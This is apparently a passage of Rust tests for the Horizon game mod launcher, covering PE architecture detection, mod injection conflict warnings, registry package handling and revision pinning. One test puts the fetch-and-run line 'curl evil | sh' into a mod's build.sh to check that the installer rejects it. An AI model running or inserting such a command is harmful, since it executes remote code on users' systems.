pub(super) static LOG_TEST: std::sync::Mutex<()> = std::sync::Mutex::new(());

use super::*;

#[test]
fn pe_machine_reads_the_architecture_after_validating_both_headers() {
    let dir = dir("pe-machine");
    let executable = dir.join("game.exe");
    let mut image = vec![0; 70];
    image[..2].copy_from_slice(b"MZ");
    image[0x3c..0x40].copy_from_slice(&64_u32.to_le_bytes());
    image[64..68].copy_from_slice(b"PE\0\0");
    image[68..70].copy_from_slice(&rust_toolchain::WINDOWS_ARM64_MACHINE.to_le_bytes());
    fs::write(&executable, &image).unwrap();
    assert_eq!(pe_machine(&executable).unwrap(), 0xaa64);

    image[64] = b'X';
    fs::write(&executable, image).unwrap();
    assert!(pe_machine(&executable)
        .unwrap_err()
        .contains("missing PE signature"));
    let _ = fs::remove_dir_all(dir);
}

#[test]
fn windows_build_platform_follows_the_selected_games_pe_machine() {
    let x64 = windows_build_platform(
        rust_toolchain::WINDOWS_X64_MACHINE,
        rust_toolchain::WINDOWS_X64_TARGET,
    )
    .unwrap();
    assert_eq!(x64.target, Some(rust_toolchain::WINDOWS_X64_TARGET));
    assert_eq!(x64.machine, Some(rust_toolchain::WINDOWS_X64_MACHINE));
    assert_eq!(x64.cache_key(), None, "preserve the x64 cache layout");

    let arm64 = windows_build_platform(
        rust_toolchain::WINDOWS_ARM64_MACHINE,
        rust_toolchain::WINDOWS_ARM64_TARGET,
    )
    .unwrap();
    assert_eq!(arm64.target, Some(rust_toolchain::WINDOWS_ARM64_TARGET));
    assert_eq!(arm64.machine, Some(rust_toolchain::WINDOWS_ARM64_MACHINE));
    assert_eq!(
        arm64.cache_key(),
        Some(rust_toolchain::WINDOWS_ARM64_TARGET)
    );

    assert!(windows_build_platform(
        rust_toolchain::WINDOWS_X64_MACHINE,
        rust_toolchain::WINDOWS_ARM64_TARGET,
    )
    .is_err());
    assert!(windows_build_platform(
        rust_toolchain::WINDOWS_ARM64_MACHINE,
        rust_toolchain::WINDOWS_X64_TARGET,
    )
    .is_err());
    assert!(windows_build_platform(0xa641, rust_toolchain::WINDOWS_ARM64_TARGET).is_err());
}

#[test]
fn a_rebuild_leaves_the_old_builds_mod_data_behind() {
    use std::ffi::OsStr;
    for own in [
        backend::CLIENT,
        ".installed",
        "native-mods.json",
        "native-data",
    ] {
        assert!(!carried_over(OsStr::new(own), Target::Client), "{own}");
    }
    for kept in ["horizon-ctl", "resources", "LICENSE"] {
        assert!(carried_over(OsStr::new(kept), Target::Client), "{kept}");
    }
    // A server build keeps neither the game's own binary nor a stale `horizon-engine` the
    // base shipped, which would run unmodded beside the built one.
    let engine = Target::Server.binary();
    assert!(
        !carried_over(OsStr::new(&engine), Target::Server),
        "{engine}"
    );
    assert!(!carried_over(OsStr::new(backend::CLIENT), Target::Server));
    assert!(carried_over(OsStr::new("resources"), Target::Server));
}

pub(super) fn dir(name: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("horizon-native-{name}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&d);
    fs::create_dir_all(&d).unwrap();
    d
}

/// The launcher's toolchain in `dir` for every host it ships one for: the build commands are
/// checked for each host on whichever machine runs the tests, not only for its own.
fn toolchains(dir: impl Into<PathBuf>) -> Vec<Toolchain> {
    let dir = dir.into();
    rust_toolchain::hosts()
        .iter()
        .map(|host| Toolchain {
            dir: dir.clone(),
            host,
        })
        .collect()
}

/// What `rust`'s host puts before cargo's subcommand ([`Toolchain::configure_cargo`]): the
/// ARM64 target's rustflags, nothing on the other hosts.
fn host_args(rust: &Toolchain) -> Vec<String> {
    let mut cmd = Command::new("cargo");
    rust.configure_cargo(&mut cmd);
    cmd.get_args()
        .map(|a| a.to_string_lossy().into_owned())
        .collect()
}

/// `cmd`'s arguments after its host's own ([`host_args`]), which must come first.
fn args_after_host(rust: &Toolchain, cmd: &Command) -> Vec<String> {
    let args: Vec<String> = cmd
        .get_args()
        .map(|a| a.to_string_lossy().into_owned())
        .collect();
    let host = host_args(rust);
    assert_eq!(args[..host.len()], host, "{}", rust.host.target);
    args[host.len()..].to_vec()
}

fn write_bundle(at: &Path, id: &str, helper: &str) {
    fs::create_dir_all(at).unwrap();
    let manifest = format!("[mod]\nid = \"{id}\"\nversion = \"0.1.0\"\n");
    fs::write(at.join(MANIFEST), manifest).unwrap();
    fs::write(at.join("hook.rs"), helper).unwrap();
}

#[test]
fn horizon_mixins_finds_the_launchers_cargo() {
    for rust in toolchains("/rust/1.99.1-x") {
        horizon_mixins_finds(&rust);
    }
}

fn horizon_mixins_finds(rust: &Toolchain) {
    let cmd = apply(
        rust,
        Path::new("/tools/horizon-mixins"),
        Path::new("/src"),
        Path::new("/mods"),
        Path::new("/out"),
    );
    let path = cmd
        .get_envs()
        .find(|(k, _)| *k == "PATH")
        .and_then(|(_, v)| v)
        .unwrap();
    assert_eq!(
        std::env::split_paths(path).next(),
        Some(rust.dir.join("bin"))
    );
    assert_eq!(
        cmd.get_args().collect::<Vec<_>>(),
        [
            "apply",
            "--workspace",
            "/src",
            "--mods",
            "/mods",
            "--out",
            "/out"
        ]
    );
}

/// A bundle whose manifest only needs to parse, with the injections of
/// `toml`'s `[[injection]]` list read as the build's warnings read them.
fn bundle_of(id: &str, toml: &str) -> Bundle {
    // Each call its own folder: the tests run in parallel.
    static N: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
    let n = N.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let at = dir(&format!("warn-{id}-{n}"));
    write_bundle(&at, id, "fn hook() {}");
    // A fragment may carry its own `[mod]` (a priority, say).
    let manifest = if toml.starts_with("[mod]") {
        toml.to_owned()
    } else {
        format!("[mod]\nid = \"{id}\"\nversion = \"0.1.0\"\n{toml}")
    };
    fs::write(at.join(MANIFEST), manifest).unwrap();
    bundles(&at).unwrap().remove(0)
}

#[test]
fn two_mods_on_one_hook_warn_in_run_order() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"frame\"\nkind = \"HEAD\"\n",
        ),
        bundle_of(
            "beta",
            "[mod]\nid = \"beta\"\nversion = \"0.1.0\"\npriority = 200\n\
                 [[injection]]\nid = \"b\"\nhook = \"frame\"\nkind = \"HEAD\"\n",
        ),
    ];
    assert_eq!(
            warn_conflicts(&mods),
            ["mods beta, alpha both inject at hook `frame` HEAD; beta runs first (priority descending, mod id ascending)."]
        );
}

/// horizon-mixins defaults a mod's priority to 0, not to the README
/// example's 100: a mod without one runs after `priority = 50`.
#[test]
fn the_default_priority_is_zero() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"frame\"\nkind = \"HEAD\"\n",
        ),
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\nhook = \"frame\"\nkind = \"HEAD\"\npriority = 50\n",
        ),
    ];
    assert_eq!(
            warn_conflicts(&mods),
            ["mods beta, alpha both inject at hook `frame` HEAD; beta runs first (priority descending, mod id ascending)."]
        );
}

#[test]
fn a_priority_tie_orders_by_mod_id() {
    let mods = [
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\nhook = \"tick\"\nkind = \"HEAD\"\n",
        ),
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"tick\"\nkind = \"HEAD\"\n",
        ),
    ];
    assert_eq!(
            warn_conflicts(&mods),
            ["mods alpha, beta both inject at hook `tick` HEAD; alpha runs first (priority descending, mod id ascending)."]
        );
}

#[test]
fn an_injections_priority_overrides_its_mods() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"tick\"\nkind = \"HEAD\"\npriority = 50\n",
        ),
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\nhook = \"tick\"\nkind = \"HEAD\"\n",
        ),
    ];
    // beta's is 0 (the default), alpha's 50: alpha first.
    assert_eq!(
            warn_conflicts(&mods),
            ["mods alpha, beta both inject at hook `tick` HEAD; alpha runs first (priority descending, mod id ascending)."]
        );
}

#[test]
fn two_mods_on_one_raw_target_warn_too() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\ntarget = \"game::calls::compute\"\nkind = \"HEAD\"\n",
        ),
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\ntarget = \"game::calls::compute\"\nkind = \"HEAD\"\n",
        ),
    ];
    assert_eq!(
            warn_conflicts(&mods),
            ["mods alpha, beta both inject at `game::calls::compute` HEAD; alpha runs first (priority descending, mod id ascending)."]
        );
}

/// HEAD and RETURN wrap the whole function: HEAD runs on entry, RETURN
/// on return, whatever the priorities, so no "runs first".
#[test]
fn head_and_return_on_one_function_warn_without_a_runs_first() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"tick\"\nkind = \"HEAD\"\n",
        ),
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\nhook = \"tick\"\nkind = \"RETURN\"\n",
        ),
    ];
    assert_eq!(
            warn_conflicts(&mods),
            ["mods alpha (HEAD), beta (RETURN) inject into hook `tick`: HEAD runs on entry, RETURN on return, whatever their priorities."]
        );
}

/// Two interior injections of one function with different selectors are
/// different places: horizon-mixins resolves the selector against the
/// source, the launcher does not guess it.
#[test]
fn different_selectors_are_different_places() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"tick\"\nkind = \"BEFORE_CALL\"\n\
                 selector = \"x\"\n",
        ),
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\nhook = \"tick\"\nkind = \"BEFORE_CALL\"\n\
                 selector = \"y\"\n",
        ),
    ];
    assert!(warn_conflicts(&mods).is_empty());
}

#[test]
fn same_selector_and_ordinal_is_one_place() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"tick\"\nkind = \"BEFORE_CALL\"\n\
                 selector = \"x\"\nordinal = 1\n",
        ),
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\nhook = \"tick\"\nkind = \"BEFORE_CALL\"\n\
                 selector = \"x\"\nordinal = 1\n",
        ),
    ];
    assert_eq!(
            warn_conflicts(&mods),
            ["mods alpha, beta both inject at hook `tick` BEFORE_CALL selector `x` ordinal 1; alpha runs first (priority descending, mod id ascending)."]
        );
}

#[test]
fn different_sites_stay_quiet() {
    let mods = [
        bundle_of(
            "alpha",
            "[[injection]]\nid = \"a\"\nhook = \"frame\"\nkind = \"HEAD\"\n",
        ),
        bundle_of(
            "beta",
            "[[injection]]\nid = \"b\"\nhook = \"tick\"\nkind = \"HEAD\"\n",
        ),
    ];
    assert!(warn_conflicts(&mods).is_empty());
}

#[test]
fn a_cancelling_head_on_a_hook_point_warns() {
    let mods = [bundle_of(
        "alpha",
        "[[injection]]\nid = \"stop\"\nhook = \"frame\"\nkind = \"HEAD\"\ncancellable = true\n",
    )];
    assert_eq!(
            warn_conflicts(&mods),
            ["alpha's `stop` can cancel at hook `frame` HEAD: a Break skips the later injections and the function's body."]
        );
}

/// Cancellation is allowed on the interior kinds too, but what a Break
/// skips there is less than the body: only `HEAD` is said.
#[test]
fn a_cancelling_interior_kind_stays_quiet() {
    let mods = [bundle_of(
        "alpha",
        "[[injection]]\nid = \"stop\"\nhook = \"tick\"\nkind = \"BEFORE_CALL\"\n\
             cancellable = true\n",
    )];
    assert!(warn_conflicts(&mods).is_empty());
}

#[test]
fn a_cancelling_injection_on_a_raw_target_stays_quiet() {
    // Whether a raw target fires a hook point only the catalog knows,
    // which the launcher does not read.
    let mods = [bundle_of(
        "alpha",
        "[[injection]]\nid = \"stop\"\ntarget = \"game::tick\"\nkind = \"HEAD\"\n\
             cancellable = true\n",
    )];
    assert!(warn_conflicts(&mods).is_empty());
}

#[test]
fn one_mod_with_two_injections_on_one_site_stays_quiet() {
    let mods = [bundle_of(
        "alpha",
        "[[injection]]\nid = \"first\"\nhook = \"frame\"\nkind = \"HEAD\"\n\
             [[injection]]\nid = \"second\"\nhook = \"frame\"\nkind = \"HEAD\"\n",
    )];
    assert!(warn_conflicts(&mods).is_empty());
}

#[test]
fn a_manifest_without_injections_builds_an_empty_list() {
    let mods = [bundle_of("alpha", "")];
    assert!(mods[0].injections.is_empty());
    assert!(warn_conflicts(&mods).is_empty());
}

#[test]
fn an_entry_without_a_site_is_left_out() {
    let mods = [bundle_of(
        "alpha",
        "[[injection]]\nid = \"broken\"\nkind = \"HEAD\"\n",
    )];
    assert!(mods[0].injections.is_empty());
}

#[test]
fn a_folder_is_one_bundle_or_a_folder_of_them() {
    let one = dir("one");
    write_bundle(&one, "hello", "fn hook() {}");
    let found = bundles(&one).unwrap();
    assert_eq!(
        (found[0].id.as_str(), found[0].version.as_str()),
        ("hello", "0.1.0")
    );
    let many = dir("many");
    write_bundle(&many.join("b"), "beta", "fn hook() {}");
    write_bundle(&many.join("a"), "alpha", "fn hook() {}");
    fs::create_dir_all(many.join("notes")).unwrap();
    let ids: Vec<String> = bundles(&many).unwrap().into_iter().map(|b| b.id).collect();
    assert_eq!(ids, ["alpha", "beta"]);
    assert!(bundles(&many.join("notes")).is_err());
}

#[test]
fn mixin_input_excludes_trait_only_bundles_but_keeps_trait_injections() {
    let root = dir("mixed-mixin-input");
    let incoming = root.join("incoming");
    for (id, injection) in [
            ("plain", ""),
            ("ordinary", "[[injection]]\nid = 'ordinary'\n"),
            ("trait_injection", "[[injection]]\nid = 'hook'\ntarget = 'horizon_client::game::tick'\nkind = 'HEAD'\ntrait_method = 'tick'\n"),
        ] {
            let bundle = incoming.join(id);
            fs::create_dir_all(bundle.join("engine")).unwrap();
            fs::write(bundle.join("engine/Cargo.toml"), "[package]\nname = 'example'\nversion = '1.0.0'\n").unwrap();
            fs::write(bundle.join(MANIFEST), format!("[mod]\nid = '{id}'\nversion = '1'\n[api]\npath = 'engine'\n{injection}")).unwrap();
        }
    let mods = bundles(&incoming).unwrap();
    assert!(!mods[1].mixins_content);
    assert!(mods[0].mixins_content && mods[2].mixins_content);
    let key = inject_cache::key("rev", "mixins", Profile::Performance, &mods).unwrap();
    let without_plain: Vec<_> = mods.iter().filter(|b| b.id != "plain").cloned().collect();
    assert_ne!(
        key,
        inject_cache::key("rev", "mixins", Profile::Performance, &without_plain).unwrap()
    );

    let injections = inject::prepare(&mods, &root).unwrap();
    assert_eq!(injections.len(), 1);
    let input = root.join("mixins");
    stage_mixins(&mods, &input).unwrap();
    assert!(!input.join("plain").exists());
    assert!(input.join("ordinary").join(MANIFEST).is_file());
    assert!(input
        .join("trait_injection")
        .join("horizon-trait-injection-0.rs")
        .is_file());
    let manifest = fs::read_to_string(input.join("trait_injection").join(MANIFEST)).unwrap();
    assert!(manifest.contains("horizon-trait-injection-0.rs"));
    assert!(!manifest.contains("trait_method"));

    for id in ["plain", "ordinary"] {
        fs::create_dir_all(incoming.join(id).join("data")).unwrap();
        fs::write(incoming.join(id).join("data/table.txt"), id).unwrap();
    }
    let stage = root.join("stage");
    stage_trait_data(&mods, &stage).unwrap();
    let read = |id: &str| fs::read_to_string(stage.join("native-data").join(id).join("table.txt"));
    assert_eq!(read("plain").unwrap(), "plain");
    assert!(read("ordinary").is_err(), "horizon-mixins stages it");
    fs::remove_dir_all(root).unwrap();
}

const A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

/// An unpacked `.hnmod`, as the registry ships one (horizon_mods::index::native).
fn write_native(at: &Path, id: &str, horizon: &str, mixins: &str) {
    let manifest = serde_json::json!({"schema": 1, "id": id, "version": "0.3.0", "game": "26.3",
            "horizon": horizon, "mixins": mixins});
    fs::create_dir_all(at.join("mixins").join(id)).unwrap();
    fs::write(at.join(NATIVE_MANIFEST), manifest.to_string()).unwrap();
    let toml = format!(
            "[mod]\nid = \"{id}\"\nversion = \"0.3.0\"\n[compatibility]\nhorizon_revision = \"{horizon}\"\n"
        );
    fs::write(at.join("mixins").join(id).join(MANIFEST), toml).unwrap();
}

#[test]
fn a_registry_download_is_a_bundle_with_its_pins() {
    let d = dir("hnmod");
    write_native(&d.join("veinminer"), "veinminer", A, B);
    write_bundle(&d.join("local"), "hello", "fn hook() {}");
    let found = bundles(&d).unwrap();
    assert_eq!(found.len(), 2);
    assert_eq!(found[1].id, "veinminer");
    assert_eq!(found[1].dir, d.join("veinminer/mixins/veinminer"));
    assert_eq!(found[1].horizon.as_deref(), Some(A));
    assert_eq!(found[1].mixins.as_deref(), Some(B));
    assert_eq!(
        (found[0].horizon.as_ref(), found[0].mixins.as_ref()),
        (None, None)
    );
}

#[test]
fn installed_mods_are_the_checked_files_of_those_turned_on() {
    let d = dir("installed-src");
    write_native(&d, "veinminer", A, B);
    let home = dir("installed-home");
    fs::create_dir_all(home.join(INSTALLED)).unwrap();
    let pack = |name: &str, extra: Option<(&str, &str)>| {
        let mut zip =
            zip::ZipWriter::new(fs::File::create(home.join(INSTALLED).join(name)).unwrap());
        let options = zip::write::SimpleFileOptions::default();
        for file in [NATIVE_MANIFEST, "mixins/veinminer/horizon-mixin.toml"] {
            zip.start_file(file, options).unwrap();
            zip.write_all(&fs::read(d.join(file)).unwrap()).unwrap();
        }
        if let Some((file, body)) = extra {
            zip.start_file(file, options).unwrap();
            zip.write_all(body.as_bytes()).unwrap();
        }
        zip.finish().unwrap();
    };
    pack("veinminer.hnmod", None);
    assert!(installed_mods(&home).is_err(), "off until turned on");
    crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
    let out = installed_mods(&home).unwrap();
    let found = bundles(&out).unwrap();
    assert_eq!(
        (found[0].id.as_str(), found[0].horizon.as_deref()),
        ("veinminer", Some(A))
    );
    // What a build records of it is what the Mods page compares: up to date, not Needs rebuild.
    assert_eq!(
        crate::native_status::enabled(&home),
        [(
            "veinminer".to_string(),
            "0.3.0".to_string(),
            source_digest(&found[0])
        )]
    );
    repin(&found[0], "f".repeat(40).as_str()).unwrap();
    assert_ne!(
        crate::native_status::enabled(&home)[0].2,
        source_digest(&found[0]),
        "a build reads the digest before repinning its copy"
    );
    pack(
        "veinminer.hnmod",
        Some(("mixins/veinminer/data/table.bin", "data")),
    );
    let out = installed_mods(&home).unwrap();
    let path = out.join("veinminer/mixins/veinminer/data/table.bin");
    assert_eq!(fs::read(&path).unwrap(), b"data");
    let first = version_for(
        A,
        B,
        Profile::Performance,
        Target::Client,
        None,
        &bundles(&out).unwrap(),
    )
    .unwrap();
    fs::write(path, b"changed").unwrap();
    assert_ne!(
        first,
        version_for(
            A,
            B,
            Profile::Performance,
            Target::Client,
            None,
            &bundles(&out).unwrap()
        )
        .unwrap()
    );
    pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
    assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
}

#[test]
fn the_mods_of_one_build_pin_one_revision() {
    let pinned = |id: &str, horizon: Option<&str>| Bundle {
        id: id.into(),
        version: "1".into(),
        dir: PathBuf::new(),
        horizon: horizon.map(str::to_owned),
        mixins: None,
        hooks: None,
        injections: Vec::new(),
        api: None,
        mixins_content: false,
    };
    let never = || -> Result<String, String> { panic!("a pin wins") };
    fn get(b: &Bundle) -> Option<&String> {
        b.horizon.as_ref()
    }
    let same = [
        pinned("a", Some(A)),
        pinned("b", None),
        pinned("c", Some(A)),
    ];
    assert_eq!(agreed(&same, "Horizon", get, never).unwrap(), A);
    let none = [pinned("a", None)];
    assert_eq!(agreed(&none, "Horizon", get, || Ok(B.into())).unwrap(), B);
    let split = [pinned("veinminer", Some(A)), pinned("minimap", Some(B))];
    let err = agreed(&split, "Horizon", get, never).unwrap_err();
    assert!(
        err.contains("veinminer → aaaaaaa") && err.contains("minimap → bbbbbbb"),
        "{err}"
    );
    let bad = [pinned("a", Some("nightly"))];
    assert!(agreed(&bad, "Horizon", get, never).is_err());
}

/// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
/// every build of their instance compiled that commit, whatever Nightly or profile they
/// picked. A build now compiles the picked version's own commit first (`on_base`) and moves
/// to the pin only for a mod that doesn't build there ([`made_elsewhere`]); then it says
/// which mod chose the commit.
#[test]
fn a_pin_chooses_the_commit_unless_the_player_builds_on_the_picked_version() {
    let pinned = |id: &str, horizon: Option<&str>| Bundle {
        id: id.into(),
        version: "1".into(),
        dir: PathBuf::new(),
        horizon: horizon.map(str::to_owned),
        mixins: None,
        hooks: None,
        injections: Vec::new(),
        api: None,
        mixins_content: false,
    };
    // A: the pin (an older Nightly); B: the Nightly the player picked.
    let picked = || -> Result<String, String> { Ok(B.into()) };
    let no_date = |_: &str| -> Result<String, String> { panic!("one pin: no date needed") };
    let mods = [pinned("right_click_crops", Some(A)), pinned("zoom", None)];
    assert_eq!(
        pinned_revision(&mods, false, picked, no_date).unwrap(),
        (A.to_owned(), vec!["right_click_crops".to_owned()]),
        "the pin wins over the picked Nightly, and the build knows whose it is"
    );
    assert_eq!(
        pinned_revision(&mods, true, picked, no_date).unwrap(),
        (B.to_owned(), Vec::new()),
        "Rebuild on Horizon builds on the picked Nightly"
    );
    assert_eq!(
        pinned_revision(&mods[1..], false, picked, no_date).unwrap(),
        (B.to_owned(), Vec::new()),
        "no pin: the picked Nightly"
    );
    let offline = || -> Result<String, String> { Err("offline".into()) };
    assert!(pinned_revision(&mods, true, offline, no_date).is_err());
}

/// Every build tries the picked Horizon first: only a mod pinning another commit, left out
/// for not building there, moves the build to its commit.
#[test]
fn only_a_pinned_mod_left_out_for_its_version_moves_the_build() {
    let bundle = |id: &str, horizon: Option<&str>, hooks: Option<u32>| Bundle {
        id: id.into(),
        version: "1".into(),
        dir: PathBuf::new(),
        horizon: horizon.map(str::to_owned),
        mixins: None,
        hooks,
        injections: Vec::new(),
        api: None,
        mixins_content: false,
    };
    let mods = [
        bundle("freecam_plus", Some(A), None),
        bundle("zoom", Some(A), Some(1)),
        bundle("local", None, None),
    ];
    let left = |id: &str, why: isolate::Why| LeftOut {
        id: id.into(),
        version: "1".into(),
        why,
    };
    assert!(made_elsewhere(&mods, &[]).is_empty());
    assert_eq!(
        made_elsewhere(&mods, &[left("freecam_plus", isolate::Why::OtherVersion)]),
        vec!["freecam_plus".to_owned()]
    );
    let unpinned = [
        left("zoom", isolate::Why::OtherVersion),
        left("local", isolate::Why::OtherVersion),
    ];
    assert!(made_elsewhere(&mods, &unpinned).is_empty());
    let clash = [left("freecam_plus", isolate::Why::Clash("zoom".into()))];
    assert!(made_elsewhere(&mods, &clash).is_empty());
}

#[test]
fn mods_made_for_different_revisions_build_on_the_newest() {
    let pinned = |id: &str, horizon: Option<&str>, mixins: Option<&str>| Bundle {
        id: id.into(),
        version: "1".into(),
        dir: PathBuf::new(),
        horizon: horizon.map(str::to_owned),
        mixins: mixins.map(str::to_owned),
        hooks: None,
        injections: Vec::new(),
        api: None,
        mixins_content: false,
    };
    let c = "c".repeat(40);
    // a is the oldest commit, then b, then c.
    let date = |r: &str| -> Result<String, String> {
        Ok(match &r[..1] {
            "a" => "2026-10-28T00:00:00Z",
            "b" => "2026-10-29T00:00:00Z",
            _ => "2026-10-30T00:00:00Z",
        }
        .into())
    };
    let never = || -> Result<String, String> { panic!("a pin wins") };
    fn horizon(b: &Bundle) -> Option<&String> {
        b.horizon.as_ref()
    }
    fn mixins(b: &Bundle) -> Option<&String> {
        b.mixins.as_ref()
    }
    let split = [
        pinned("veinminer", Some(B), Some(&c)),
        pinned("lookat", Some(A), Some(A)),
        pinned("zoom", None, None),
    ];
    assert_eq!(
        newest(&split, "Horizon", horizon, never, None, date).unwrap(),
        B
    );
    // horizon-mixins: never older than a pin, and the launcher's own when it is newer.
    assert_eq!(
        newest(&split, "horizon-mixins", mixins, never, Some(B), date).unwrap(),
        c
    );
    let older = [pinned("a", None, Some(A)), pinned("b", None, Some(B))];
    assert_eq!(
        newest(&older, "horizon-mixins", mixins, never, Some(&c), date).unwrap(),
        c
    );
    // One pin, or the same one everywhere: that pin, and no date is asked for.
    let no_date = |_: &str| -> Result<String, String> { panic!("no date needed") };
    let same = [pinned("a", Some(A), None), pinned("b", Some(A), None)];
    assert_eq!(
        newest(&same, "Horizon", horizon, never, None, no_date).unwrap(),
        A
    );
    let offline = |_: &str| -> Result<String, String> { Err("offline".into()) };
    let err = newest(&split, "Horizon", horizon, never, None, offline).unwrap_err();
    assert!(err.contains("offline"), "{err}");
    // What the player is shown: each mod made for another revision, and the build's.
    assert_eq!(
        mismatch(&split, B).unwrap(),
        "lookat → aaaaaaa; the build uses bbbbbbb"
    );
    assert_eq!(mismatch(&same, A), None);
    let hooked = [Bundle {
        hooks: Some(1),
        ..pinned("minimap", Some(A), None)
    }];
    assert_eq!(mismatch(&hooked, B), None, "hook mods follow the build");
}

#[test]
fn a_commit_date_is_asked_once_and_kept() {
    let d = dir("commit-dates");
    let file = d.join(DATES);
    let ask = |_: &str, r: &str| -> Result<String, String> { Ok(format!("date of {r}")) };
    assert_eq!(
        remembered(&file, "acme/x", A, ask).unwrap(),
        format!("date of {A}")
    );
    let offline = |_: &str, _: &str| -> Result<String, String> { Err("offline".into()) };
    assert_eq!(
        remembered(&file, "acme/x", A, offline).unwrap(),
        format!("date of {A}")
    );
    // Another repo or revision isn't known yet.
    assert!(remembered(&file, "acme/y", A, offline).is_err());
    assert!(remembered(&file, "acme/x", B, offline).is_err());
    // A broken file is asked again and rewritten.
    fs::write(&file, "not json").unwrap();
    assert_eq!(
        remembered(&file, "acme/x", B, ask).unwrap(),
        format!("date of {B}")
    );
    assert_eq!(
        remembered(&file, "acme/x", B, offline).unwrap(),
        format!("date of {B}")
    );
}

#[test]
fn mods_on_the_hook_points_follow_the_game_or_the_pins() {
    assert_eq!(
        hooks_in("x\npub(crate) const NATIVE_HOOKS_API: u32 = 3;\n"),
        Some(3)
    );
    assert_eq!(hooks_in("const NATIVE_HOOKS_API: u32 = 3;"), None);
    let mod_ = |id: &str, horizon: &str, hooks: Option<u32>| Bundle {
        id: id.into(),
        version: "1".into(),
        dir: PathBuf::new(),
        horizon: Some(horizon.into()),
        mixins: None,
        hooks,
        injections: Vec::new(),
        api: None,
        mixins_content: false,
    };
    let c = "c".repeat(40);
    // A (the game) has hook points v1, B v2, C none.
    let at = |r: &str| match r.as_bytes()[0] {
        b'a' => Some(1),
        b'b' => Some(2),
        _ => None,
    };
    let none = || None;
    let listed = |_: &str| None;
    let zoom = [mod_("zoom", B, Some(1)), mod_("minimap", &c, Some(1))];
    assert_eq!(
        with_hooks(&zoom, A.into(), true, none, at, listed).unwrap(),
        A,
        "the game's own"
    );
    let tested = [mod_("zoom", A, Some(1))];
    assert_eq!(
        with_hooks(&tested, c.clone(), true, none, at, listed).unwrap(),
        A,
        "an older game"
    );
    assert_eq!(
        with_hooks(&tested, B.into(), false, none, at, listed).unwrap(),
        B,
        "v1 mods on v2"
    );
    let newer = [mod_("recipes", B, Some(2))];
    let err = with_hooks(&newer, A.into(), false, none, at, listed).unwrap_err();
    assert!(
        err.contains("aaaaaaa") && err.contains("recipes (hook points v2)"),
        "{err}"
    );
    assert_eq!(
        with_hooks(&newer, A.into(), true, none, at, listed).unwrap(),
        B,
        "its tested commit"
    );
    let pinned_only = [mod_("veinminer", B, None)];
    assert_eq!(
        with_hooks(&pinned_only, B.into(), false, none, at, listed).unwrap(),
        B
    );
}

/// Players on launcher 0.2.31 (#5352): a rebuild that stayed on an older Horizon (A, hook
/// points v1), or a mod pinning it, met mods needing newer hook points, tested on different
/// commits, and the build was refused although the installed game (B) has them all.
#[test]
fn mods_needing_newer_hook_points_move_the_build_to_the_installed_game() {
    let mod_ = |id: &str, horizon: &str, hooks: Option<u32>| Bundle {
        id: id.into(),
        version: "1".into(),
        dir: PathBuf::new(),
        horizon: Some(horizon.into()),
        mixins: None,
        hooks,
        injections: Vec::new(),
        api: None,
        mixins_content: false,
    };
    let (c, d) = ("c".repeat(40), "d".repeat(40));
    // A (the old build's revision) has hook points v1, B (the installed game) v7.
    let at = |r: &str| match r.as_bytes()[0] {
        b'a' => Some(1),
        b'b' => Some(7),
        _ => None,
    };
    let game = || Some(B.to_owned());
    let listed = |_: &str| None;
    let hooked = [
        mod_("zoom", &c, Some(1)),
        mod_("recipes", &d, Some(2)),
        mod_("xtoxray", B, Some(7)),
    ];
    assert_eq!(
        with_hooks(&hooked, A.into(), true, game, at, listed).unwrap(),
        B,
        "a rebuild that stayed on an older Horizon moves to the game"
    );
    let with_pin = [mod_("carryblock", A, None), mod_("recipes", &d, Some(2))];
    let revision = with_hooks(&with_pin, A.into(), false, game, at, listed).unwrap();
    assert_eq!(revision, B, "a pinned mod no longer blocks the build");
    let asked = mismatch(&with_pin, &revision).expect("the pinned mod waits for Build anyway");
    assert!(
        asked.contains("carryblock") && !asked.contains("recipes"),
        "{asked}"
    );
    // A game without them still refuses, naming only the mods that don't fit.
    let err = with_hooks(&hooked, A.into(), true, || Some(c.clone()), at, listed).unwrap_err();
    assert!(err.contains("recipes (hook points v2)"), "{err}");
    assert!(err.contains("xtoxray (hook points v7)"), "{err}");
    assert!(!err.contains("zoom"), "zoom builds on A: {err}");
}

/// likeluca_ on Discord (11-04, Windows, launchers 0.2.38 to 0.2.40): blockscope (hook points
/// v2, all named) beside shulker_peek, which pins 5e391eb, a commit that had hook points v2 but
/// no `native-hooks.json` yet (it came in d3e0774, still v2). The build stayed on the pin and
/// horizon-mixins stopped: "E_HOOK_CATALOG: a named hook needs native-hooks.json at the
/// workspace root". The build now moves to the game, whose catalog lists them.
#[test]
fn named_hook_points_need_the_revisions_catalog() {
    let d = dir("named-hooks");
    fs::write(
            d.join(MANIFEST),
            "[mod]\nid = \"blockscope\"\nversion = \"0.3.1\"\n\
